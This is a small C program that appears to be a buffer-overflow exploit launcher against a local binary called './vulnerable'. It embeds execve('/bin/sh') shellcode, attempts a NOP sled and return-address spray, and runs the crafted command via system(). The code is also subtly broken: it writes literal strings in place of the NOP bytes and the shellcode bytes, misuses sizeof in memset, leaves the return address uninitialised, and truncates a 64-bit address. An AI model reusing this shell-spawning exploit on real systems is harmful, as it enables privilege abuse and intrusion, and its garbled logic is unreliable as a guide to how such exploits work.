#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
int main(int argc, char *argv[]) {
        unsigned int i,ret;
        char *command,*buffer;


command = (char *) malloc(200);
memset(command,0,sizeof(command));// zero out the new memory
	


strcpy(command, "./vulnerable \'");
buffer=command + strlen(command);

if(argc > 1)
	ret=(unsigned int)0x7fff362423e0;



for (i=13; i<74; i++){
	strcpy((command+i), "\0x90");
}

strcpy((command + 74), "shellcode \'");
for (i=99; i<199; i+=4){
	*((unsigned int*)(command+i)) =ret;
}
strcat(command, "\'");
system(command); // run exploit
free(command);

}
